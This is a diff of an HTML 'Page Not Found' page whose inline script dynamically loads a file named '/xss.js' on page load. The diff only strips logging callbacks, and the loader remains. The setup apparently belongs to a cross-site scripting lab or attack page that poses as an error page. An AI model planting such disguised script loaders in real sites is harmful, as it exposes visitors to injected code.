@@ -9,15 +9,9 @@
     <h1>Page Not Found</h1>
     <p>Redirecting...</p>
     <script>
-        // Dynamically load and execute xss.js
+        // Create a script element and load xss.js
         var script = document.createElement('script');
         script.src = '/xss.js';
-        script.onload = function() {
-            console.log('xss.js has been loaded and executed.');
-        };
-        script.onerror = function() {
-            console.error('Failed to load xss.js.');
-        };
         document.body.appendChild(script);
     </script>
 </body>
